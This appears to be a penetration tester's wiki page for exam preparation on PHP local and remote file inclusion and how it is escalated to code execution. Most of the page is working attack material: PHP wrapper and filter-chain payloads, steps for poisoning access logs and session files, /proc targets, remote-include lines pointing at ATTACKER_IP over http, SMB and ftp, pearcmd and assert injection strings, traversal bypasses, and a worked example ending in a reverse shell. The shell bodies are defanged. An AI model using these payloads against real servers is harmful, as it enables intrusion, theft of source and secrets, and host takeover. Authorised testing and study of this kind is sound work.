---
type: technique
title: Local / Remote File Inclusion (LFI / RFI)
lang: en
status: active
wstg: ["WSTG-ATHZ-01"]
owasp_top10: ["A03:2021", "A01:2021"]
owasp_api: []
asvs: ["V5.3.2"]
cwe: ["CWE-98", "CWE-22"]
attack: ["T1190"]
cvss: ""
sources: [web-200-oswa, colleague-web-wiki, payloadsallthethings, hacktricks]
updated: 2026-09-17
---

# Local / Remote File Inclusion (LFI / RFI)

**TL;DR** — When a path parameter is *included or executed* by the app (not merely read), a
traversal bug becomes code execution. [[directory-traversal]] covers arbitrary file **read**;
this page covers turning a `?page=`/`?file=` include sink into **RCE** via PHP wrappers, filter
chains, log/session poisoning, `/proc` tricks, and — where remote URLs are allowed — RFI.

> Framework: **A03:2021 – Injection** / **A01:2021 – Broken Access Control**, `CWE-98`
> (PHP file inclusion) / `CWE-22`, ATT&CK `T1190`. WSTG `WSTG-ATHZ-01` (also mapped as file
> inclusion under `WSTG-INPV-11`).
> ⚠️ **AV/OneDrive note:** web-shell bodies below are **defanged** (placeholders) so
> Defender doesn't quarantine this synced vault. Reconstruct the working payload at test time.

## Where it applies

PHP apps are the classic target: `include($_GET['page'])`, `require`, `include_once`,
`fopen`, `readfile`, `file_get_contents`. Suggestive parameters — `page`, `file`, `lang`,
`template`, `view`, `include`, `theme`, `doc` — that end up in a filesystem or URL operation.
Also present in Java (`FileInputStream`), .NET, Node (`require`, `res.render`), and Python
(`open`, `jinja include`), though wrapper tricks are PHP-specific.

## LFI vs RFI vs traversal

- **Traversal** — read a file: `?file=../../../../etc/passwd` → contents returned.
- **LFI** — the file is *included/executed*: if you can get PHP code into a file the app
  includes, it runs → RCE.
- **RFI** — the include accepts a **remote** URL (`allow_url_include=On`) → include your
  hosted payload directly. Rare on modern PHP (off by default) but instant RCE when present.

## Detecting the sink

1. Confirm read first: request a known file and watch the response
   ([[directory-traversal]] techniques + encodings). A `?page=` that returns
   `/etc/passwd` content is LFI-capable.
2. Check whether output is *rendered/executed* or just echoed. If including a `.php` file
   runs it (you see its output, not its source), the sink executes PHP → wrappers apply.
3. Watch for an appended extension (`include($_GET['page'].".php")`) — it constrains which
   techniques work (a null byte or a wrapper that ignores the suffix is needed).

## PHP wrappers (payloads)

```text
php://filter/convert.base64-encode/resource=index.php     # exfiltrate PHP source (read, not run)
php://filter/read=convert.base64-encode/resource=config.php
php://filter/resource=/etc/passwd                          # plain read
data://text/plain;base64,PD9waHAgLi4uID8+                  # data:// exec (allow_url_include=On) — base64 of a defanged <?php ...?>
expect://id                                                # runs "id" if the expect extension is loaded
phar://malicious.phar/x                                    # phar deserialization sink (advanced)
zip://uploaded.zip%23shell.php                             # include a file inside an uploaded archive
```

- `php://filter/convert.base64-encode` is the **workhorse**: it returns any source file
  base64-encoded (so PHP tags don't execute) — read app source to find secrets and further
  bugs. Decode locally.
- **`data://` / `expect://`** give direct execution when enabled — usually the fastest RCE.

### PHP filter chain → RCE (no file upload, no logs)

When only `php://filter` is reachable and you can't write a file, chained conversion filters
can *generate* PHP from nothing and feed it to the include (the "php_filter_chain" technique).
Generate the chain with a known tool and paste the produced `php://filter/...|...` string into
the parameter. It bootstraps RCE from a pure LFI — worth knowing when every other path is
blocked.

## LFI → RCE without wrappers

**Log poisoning** — plant PHP in a file the app will include, then include it:

1. Send a request whose logged field carries PHP, e.g. the `User-Agent`:
   ```http
   GET / HTTP/1.1
   Host: victim
   User-Agent: <?php /* cmd exec: $_GET['c'] -> system -> output (reconstruct) */ ?>
   ```
2. Include the log so PHP executes:
   ```text
   ?page=../../../../var/log/apache2/access.log&c=id
   ?page=../../../../var/log/nginx/access.log
   ?page=/var/log/vsftpd.log        # also mail logs, auth.log, ssh (username = PHP)
   ```

**Session poisoning** — seed PHP into a value stored in your PHP session file, then include it:
```text
?page=../../../../var/lib/php/sessions/sess_<PHPSESSID>
```
(Get a controlled value into the session — e.g. a reflected username/preference — first.)

**/proc tricks** (older stacks):
```text
?page=/proc/self/environ         # poison via User-Agent, older PHP CGI
?page=/proc/self/fd/N            # a log fd
```

## RFI

```text
?page=http://ATTACKER_IP/shell.txt        # requires allow_url_include=On
?page=\\ATTACKER_IP\share\shell.php        # Windows UNC → SMB, can also leak NetNTLM
?page=ftp://ATTACKER_IP/shell.txt
```
Host a **defanged** payload file on your box (reconstruct the live one at test time), point
the include at it, trigger with `&c=id`. Catch shells with [[netcat]].

## Worked example — PHP `?page=` LFI → log poisoning RCE

A gallery app serves pages via `include($_GET['page'].'.php')`.

1. **Read source** to confirm the sink and beat the appended `.php`:
   ```text
   ?page=php://filter/convert.base64-encode/resource=index
   ```
   returns base64 — decode to read `index.php`, confirming `include($_GET['page'].'.php')`
   (the filter wrapper ignores the suffix).
2. **Confirm file read** for a system file (null-byte only on PHP < 5.3.4; otherwise use a
   path the suffix tolerates or a wrapper):
   ```text
   ?page=php://filter/resource=/etc/passwd
   ```
3. **Poison the access log** by sending a request with PHP in `User-Agent` (defanged above),
   then include it — the `.php` suffix is dodged because the filter path is used, or on stacks
   without the suffix simply `?page=../../../../var/log/apache2/access.log&c=id`.
4. **RCE:** the include runs the planted PHP; `c=id` returns `uid=33(www-data)`. Upgrade to a
   reverse shell (see [[command-injection]] for the one-liners, kept defanged here) and catch
   with [[netcat]].

Impact: information disclosure (source, secrets) → **RCE** and host compromise.

## Tooling

- Fuzz include parameters and traversal depth with [[ffuf]] / [[wfuzz]] against a
  LFI/traversal wordlist (SecLists `Fuzzing/LFI`); reproduce with [[curl]].
- Automate wrapper/log-poisoning attempts with LFISuite/`kadimus`-style tools — but
  **know the manual path** (the [[oswa-exam|OSWA]] exam rewards manual exploitation).

## Confirming impact

Show either sensitive source/secret disclosure (via `php://filter`) or command output
(`id`/`whoami`) proving execution. Note the path to a shell.

## Remediation

- Don't build include paths from user input — map an **allowlisted identifier** to a fixed
  server-side path (same fix as [[directory-traversal]]).
- Disable dangerous wrappers and `allow_url_include`/`allow_url_fopen`; least-privilege the
  web user; keep logs outside any includable path.
- Canonicalise then verify the resolved path stays under the intended base dir.

## Pitfalls / evasion

- Appended extension → use `php://filter` (ignores suffix) or a null byte on ancient PHP.
- `../` stripped once → `....//`; slash filtered → `..%2f`, double-encode `..%252f`
  (see [[directory-traversal]] for the full encoding set).
- Wrapper blocked but read works → pivot to log/session poisoning or a filter chain.

## More wrappers, targets & bypasses

Fuller set: [[payloadsallthethings|PaTT]] + [[hacktricks]].

**php://filter chains** (read binaries / synthesise code):

```text
php://filter/read=string.rot13/resource=/etc/passwd
php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd     # compress+encode binaries
php://filter/convert.iconv.utf-8.utf-16le/resource=index.php             # iconv building block
```
The **php_filter_chain generator** stacks many `convert.iconv.*` filters to build arbitrary
bytes (a whole PHP payload) with **no file write** — pure LFI → RCE when nothing else works.

**Extra log / session targets:**

```text
/var/log/apache2/error.log   /var/log/httpd/access_log   /var/log/mail   /var/mail/<user>
/var/lib/php5/sess_<PHPSESSID>   /proc/self/cwd/index.php
```

**Other LFI→read/RCE primitives:**

```text
?page=/usr/local/lib/php/pearcmd.php&+config-create+/&<payload>+/tmp/x.php   # pearcmd (docker php)
<img src="../../../etc/passwd">     # HTML-to-PDF / SVG renderer reading local files
' and die(highlight_file('/etc/passwd')) or '                                # assert() injection
```

**Parameters to fuzz:** `page file path include inc dir cat doc document folder view content
layout mod conf download show template lang`.

## Quick checklist

- [ ] Path/`?page=` param *included* (executed), not just read? Appended `.php`?
- [ ] Read source with `php://filter` base64 → confirm the sink + find secrets.
- [ ] RCE path: `data://`/`expect://` (if enabled) → log/session poisoning → **php_filter_chain** → RFI.
- [ ] Filtered? → `....//`, `..%252f`, overlong-UTF-8, null byte (old PHP) — see [[directory-traversal]].
- [ ] Confirm `id`; upgrade to a shell (defanged one-liner) → [[netcat]].

## See also

[[directory-traversal]] · [[command-injection]] · [[file-upload]] · [[ffuf]] · [[oswa-exam]]

*Sources: [[web-200-oswa]] module 10 (traversal → RCE); [[colleague-web-wiki]] (WSTG-ATHZ-01 framing); [[payloadsallthethings]] + [[hacktricks]] (filter chains, log/session targets, pearcmd, renderer LFI).*
